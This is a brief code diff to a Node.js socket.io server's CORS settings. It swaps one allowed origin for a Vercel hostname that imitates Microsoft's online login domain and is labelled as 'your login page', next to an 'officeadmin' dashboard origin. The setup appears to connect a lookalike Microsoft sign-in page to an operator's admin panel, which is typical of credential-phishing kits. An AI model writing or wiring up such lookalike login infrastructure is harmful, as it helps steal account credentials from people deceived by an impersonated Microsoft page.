@@ -7,7 +7,7 @@ const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: [
-      "https://montreux-hoa.vercel.app", // Your login page URL
+      "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app", // Your login page URL
       "https://officeadmin-ochre.vercel.app", // Your admin dashboard URL
     ],
     methods: ["GET", "POST"],
